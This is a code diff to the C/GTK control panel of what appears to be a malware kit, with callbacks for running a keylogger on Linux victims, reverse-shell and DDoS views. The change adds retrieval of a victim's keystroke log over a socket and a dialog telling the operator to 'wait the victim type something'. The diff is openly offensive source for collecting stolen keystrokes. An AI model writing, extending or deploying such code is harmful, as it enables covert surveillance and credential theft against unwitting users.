@@ -35,7 +35,7 @@ GtkWidget *rs_text_view;
 
 GtkWidget *ddos_text_view;
 
-
+size_t log_empty = 0;
 
 void cb_ubuntu16_run_the_keylogger(GtkButton *button, gpointer user_data)
 {
@@ -195,7 +195,6 @@ void cb_fedora_run_the_keylogger(GtkButton *button, gpointer user_data)
     return;
 }
 
-
 void cb_download_log_file(GtkButton *button, gpointer user_data)
 {
     SOCKET sock;
@@ -221,13 +220,30 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
 
     char caractere = 0;
     size_t i = 0;
-    gboolean bInconsistent;
     
-    GtkWidget *log_empty = NULL;
-    int log_is_empty = -1;
-    
+    //size_t log_empty = -1;
+    GtkWidget *log_file_empty_dialog = NULL;
     
     
+    if(log_empty == 1)
+    {
+        log_empty = 0;
+        
+        log_file_empty_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_OK, "The log file is empty !\nWait the victim type something ...\n");
+
+        gtk_widget_show_all(GTK_DIALOG(log_file_empty_dialog)->vbox);
+        switch(gtk_dialog_run(GTK_DIALOG(log_file_empty_dialog)))
+        {
+            case GTK_RESPONSE_OK:
+                gtk_widget_destroy(log_file_empty_dialog);
+                return;
+            
+            default : 
+                gtk_widget_destroy(log_file_empty_dialog);
+                return;
+        }     
+    }
+
     log_file = fopen("keylogger.log", "w");
     if(log_file == NULL)
     {
@@ -260,6 +276,34 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     if(send(sock, (char*)&flag_log, sizeof(flag_log), 0) == SOCKET_ERROR)
     {
         error("send() flag_log", "cb_download_log_file()");
+        return;
+    }
+    
+    if(recv(sock, (char*)&log_empty, sizeof(log_empty), 0) == SOCKET_ERROR)
+    {
+        error("recv() log_empty", "cb_download_log_file()");
+        return;
+    }
+    
+    if(log_empty == 1)
+    {
+        log_empty = 0;
+        
+        log_file_empty_dialog = gtk_message_dialog_new (GTK_WINDOW(main_win), GTK_DIALOG_MODAL, GTK_MESSAGE_INFO, GTK_BUTTONS_OK, "The log file is empty !\nWait the victim type something ...\n");
+
+        gtk_widget_show_all(GTK_DIALOG(log_file_empty_dialog)->vbox);
+        switch(gtk_dialog_run(GTK_DIALOG(log_file_empty_dialog)))
+        {
+            case GTK_RESPONSE_OK:
+                gtk_widget_destroy(log_file_empty_dialog);
+                return;
+            
+            default : 
+                gtk_widget_destroy(log_file_empty_dialog);
+                return;
+        }
+        
+        fclose(log_file);
         return;
     }
     
@@ -328,13 +372,3 @@ void cb_download_log_file(GtkButton *button, gpointer user_data)
     
     return;
 }
-
-
-/*   
-if(data_len == 0)
-    {
-        bInconsistent = gtk_toggle_button_get_inconsistent(GTK_TOGGLE_BUTTON(button));
-        gtk_toggle_button_set_inconsistent(GTK_TOGGLE_BUTTON(button), (bInconsistent ^ FALSE));
-        return;
-    }
- */
